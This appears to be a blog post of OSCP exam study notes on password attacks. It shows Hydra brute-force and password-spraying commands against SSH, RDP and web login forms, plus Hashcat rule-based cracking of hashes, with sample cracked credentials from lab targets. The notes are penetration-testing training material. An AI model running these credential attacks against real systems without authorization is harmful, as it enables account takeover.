---
title: Password Attacks
date: 2024-03-04 04:15:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Password Attacks tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Password Attacks

## Attacking Network Services Logins

Here, we will cover attacking SSH, RDP, and HTTP POST logins.

### SSH and RDP

Let's use THC Hydra for dictionary attacks.

Firstly, lets try SSH on port 2222 to find the password of a user named george.

```console
$ cd /usr/share/wordlists/

// if rockyou is not already uncompressed:
$ sudo gzip -d rockyou.txt.gz

$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
[2222][ssh] host: 192.168.188.201   login: george   password: chocolate
```

If we don't know a valid username, use enumeration and info gathering to find one. Or, attack built-in accounts like root (Linux target) or Administrator (Windows target).

Let's try using a single password against many usernames (password spray). We may find plaintext passwords many places, even [online leaks](https://scatteredsecrets.com/).

Assume we found the valid password MyS3cuR3Pas$! We will use hydra again to set the list of usernames with -L /usr/share/wordlists/dirb/others/names.txt and the single password with -p MyS3cuR3Pas$!

```console
$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "MyS3cuR3Pas$!" rdp://111.111.111.111
```

Sometimes multiple users use the same password or users have the same password across multiple systems.

### HTTP POST Login Form

Consider using a dictionary attack when faced with a web login that does not accept default credentials. Most have a default user like admin. Let's try to target TinyFileManager on port 80. TinyFileManager hosts two default users, admin and user. Let's try user.

Hydra will not make it as straighforward to attack an HTTP POST login form. We will need both the POST data (contains request body with username and password) and a failed login capture. We will use Burp Intercept. With intercept on, enter "user" for the username, and any password before submitting the login form.

```
...
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: filemanager=lvs6k38vnlim129jbr1bdo0qg3
Connection: close

fm_usr=user&fm_pwd=password
```

The last line above is the request body we need to provide to Hydra. Now, forward the request to generate the failed login. In our case, the webpage prints "Login failed. Invalid username or password". We will provide this to Hydra as the identifier for a failed login.

NOTE: In more complex webapps, we might need to inspect the source code of the login form to isolate a failed login indicator or just dig deeper into the rqst/rspns.

```console
$ hydra -l user -P /usr/share/wordlists/rockyou.txt 111.111.111.111 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

The http-post-form takes three colon-delimited fields in this format:

"locationofloginform:requestbodyforlogin:failedloginidentifier"
"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

We are shortening the failedloginidentifer condition string here to reduce false positives: keeping keywords like "username" or "password" would give too many FPs.

Extra example: Target webpage was password protected with one of those login browser popups, and BurpSuite interception shows that the username and password were base64 encoded.

```console
$ hydra -l admin -P /home/kali/Desktop/oscp/rockyou.txt http-get://192.168.188.201
```

## Password Cracking Fundamentals

Let's review the cracking of passwords found as encrypted ciphertexts or hashes.

```console
$ echo -n "secret" | sha256sum
```

The cracking time of various hash representations can be calculated by dividing the keyspace with the hash rate.

Keyspace = the character to the power of the amount of characters (length) of the password.
```console
$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
62

$ python3 -c "print(62**5)"
916132832
```

The hash rate measures how many hash calculations can be completed in a second. We can use Hashcat to benchmark this.

```console
$ hashcat -b
hashcat (v6.2.5) starting in benchmark mode
...
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
```

You can now calculate the time needed to crack by dividing your keyspace result by the hash rate. You result will be output in seconds.

### Mutating Wordlists

We should remove all passwords from wordlists that do not comply with a password policy we know is implemented using a rule-based attack.

For a rule-based attack, we need to create a rule file to give the cracking tool. The [HashCat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) has all possible rule functions to help you. HashCat also has provided rules in ls -la /usr/share/hashcat/rules/

Let's demonstrate rule functions:

```console
$ cat head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123

$ mkdir passwordattacks

$ cd passwordattacks

$ head /usr/share/wordlists/rockyou.txt > demo.txt

// the following command tells sed to delete all lines that start with the number 1
$ sed -i '/^1/d' demo.txt     

$ cat demo.txt
password
iloveyou
princess
rockyou
abc123
```

Let's write a rule for HashCat:

```console
// appends "1" to all lines in wordlist
$ echo \$1 > demo.rule

// starting hashcat in debug mode, this will not crack anything, just display mutated passwords
$ hashcat -r demo.rule --stdout demo.txt
```

NOTE: Get a "Not enough allocatable device memory..." error? Shut down Kali and add more RAM.

Two options for running two rules:
```console
// the c rule function simply capatalizes the first letter and converts the rest to lowercase
$ nano demo1.rule
$1 c

$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

$ nano demo2.rule
$1
c

$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```

Lastly, let's add a special character:

```console
$ nano demo1.rule
$1 c $!

$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

$ nano demo2.rule

$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

Time to crack!

```console
$ nano crackme.txt
f621b6c9eab51a3e2f4e167fee4c6860

$ cat demo3.rule   
$1 c $!
$2 c $!
$1 $2 $3 c $!

$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
hashcat (v6.2.5) starting
...
f621b6c9eab51a3e2f4e167fee4c6860:Computer123!
```

TIP: Most users rely on special characters on the left side of the keyboard.

Rule examples:

Append stuff to the end of each password: $1 $@ $3 $$ $5
Capitalize everything and duplicate the password: u d

### Cracking Methodology

You can use these tools to determine what algorithm hashed the password you found:
https://www.kali.org/tools/hash-identifier/
https://www.kali.org/tools/hashid/

Be certain to put your hashes in SINGLE quotes if they contain special characters, like $ hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
